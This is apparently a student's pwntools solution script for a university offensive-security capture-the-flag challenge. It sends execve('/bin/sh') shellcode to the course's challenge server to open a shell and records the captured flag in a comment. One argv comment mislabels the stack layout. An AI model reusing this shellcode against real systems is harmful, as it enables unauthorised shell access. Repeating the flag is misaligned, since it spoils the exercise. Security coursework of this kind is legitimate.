from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./no_leaks"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1293
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

shellcode = asm('''
    xor rdx, rdx                # rdx = NULL (envp pointer)
    mov rax, 0x68732f6e69622f   # Define hex for "/bin/sh" string
    push rax                    # Push "/bin/sh" string onto stack
    mov rdi, rsp                # rdi = address of "/bin/sh" string on stack (pathname pointer)
    push rdi                    # Push string address onto stack for argv[0]
    push rdx                    # Push NULL onto stack for argv[1]
    mov rsi, rsp                # rsi = address of argv array ["/bin/sh", NULL] (argv pointer)
    mov rax, 0x3b               # execve syscall number
    syscall                     # Call execve(rdi, rsi, rdx)
''', arch='amd64')

print(p.recvuntil(b"?\n").decode())
p.send(shellcode)
log.info(f"Sending shellcode in raw bytes: {shellcode}")

p.interactive()

# flag{w3_c4n_st1ll_d3f34t_m0d3rn_c0d3!_81dfe7a505090511}
